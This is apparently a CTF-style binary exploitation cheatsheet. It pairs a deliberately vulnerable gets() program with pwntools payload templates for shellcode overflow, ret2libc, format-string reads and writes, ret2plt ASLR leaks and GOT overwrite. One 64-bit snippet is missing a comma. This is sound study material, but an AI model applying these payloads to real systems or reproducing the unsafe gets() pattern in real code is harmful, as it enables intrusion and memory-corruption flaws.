---
title: "Binex Stack"
description: "Cheatsheet"
date: "2025-8-3"
---

## Simple stack shellcode
```c
// gcc source.c -o vuln -no-pie -fno-stack-protector -z execstack -m32

#include <stdio.h>

void unsafe() {
    char buffer[300];
    
    puts("Overflow me");
    gets(buffer); //vulnerable function
}

void main() {
    unsafe();
}
```

The goal is to overwrite the stack layout of the unsafe function. The gets(buffer) call allows you to write past the buffer's boundary and change crucial control data.

1. Stack Before Overflow
This is the state of the stack right after the unsafe function is called and space for the buffer is allocated.

```
      LOW MEMORY ADDRESSES
      ^
      |
+------------------------+  <-- Stack Pointer (ESP) points here
|                        |
|      buffer[300]       |
|                        |
+------------------------+
| Old Frame Pointer (EBP)|
+------------------------+
|   Return Address (EIP) |  <-- The address to jump to after the function returns
+------------------------+
|      Function Args     |
+------------------------+
      |
      v
      HIGH MEMORY ADDRESSES
```

2. Stack After Overflow
Your payload is sent via gets(). It fills the buffer, overflows past it, and overwrites the saved EBP and the crucial Return Address.

```
      LOW MEMORY ADDRESSES
      ^
      |
+------------------------+
|                        |
|   Shellcode + NOPs     |   <-- Fills the buffer from the top down
|                        |
+------------------------+
|      NOP Padding       |   <-- Overwrites the original EBP
+------------------------+
|    0xFFFFBAE4 (EIP)    |   <-- Overwrites the Return Address with your target
+------------------------+
|      Function Args     |
+------------------------+
      |
      v
      HIGH MEMORY ADDRESSES
```

When the unsafe function finishes, it reads the corrupted return address (0xFFFFBAE4) and jumps to your shellcode, giving you control of the program.

## 64 bit function
In 64-bit, the first 6 args are stored in the registers RDI, RSI, RDX, RCX, R8 and R9 respectively as per the calling convention. The rest are pushed onto the stack.

## Checksec
```
Arch:       -> In x64, use rop gadget to reach the register. In x86, just use stack
Stack:      -> Leak it, fully or partially by LSB injection through overflow or format string
NX:         -> ROP
PIE:        -> leak certain address and use it to calculate the base address. Usually ends with 0x1000
Stripped:   -> annoying
```
## ROP
```bash
ropper -f ./vuln
```

## Ret2libc
```python
rop = ROP(exe)
poprdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

libc = exe.libc
libc.address = 0x00007FFFF7C00000 #get address leak
system = libc.sym["system"] # get system address
binsh = next(libc.search(b"/bin/sh")) # get /bin/sh address

payload = flat(
    {
        offset: [
            poprdi,
            binsh,
            ret,
            system,
        ]
    }
)
```

## Format string
```c
printf(buffer); //vulnerable function
```

```python

#payload = b"AAAA" + b":%p" * 30
#payload = b"AAAA" + b":%7$p"
elf = ELF('./auth')

payload = fmtstr_payload(7, {AUTH : 10})
```

## ASLR bypass
### Ret2plt
Prints puts address in libc
```python
# 32-bit ret2plt
payload = flat(
    b'A' * padding,
    elf.plt['puts'],
    elf.symbols['main'],
    elf.got['puts']
)

# 64-bit
payload = flat(
    b'A' * padding,
    POP_RDI,
    elf.got['puts']
    elf.plt['puts'],
    elf.symbols['main']
)
```

## %s format string arbitrary read
```python
payload = p32(elf.got['puts'])      # p64() if 64-bit
payload += b'|'
payload += b'%3$s'                  # The third parameter points at the start of the buffer


# this part is only relevant if you need to call the function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])

# Send it off...

p.recvuntil(b'|')                   # This is not required
puts_leak = u32(p.recv(4))          # 4 bytes because it's 32-bit
```
## GOT overwrite
Basically rewrite the GOT entry of a function to point to another function
```python
payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
```

## Ret2reg
example: `jmp esp`
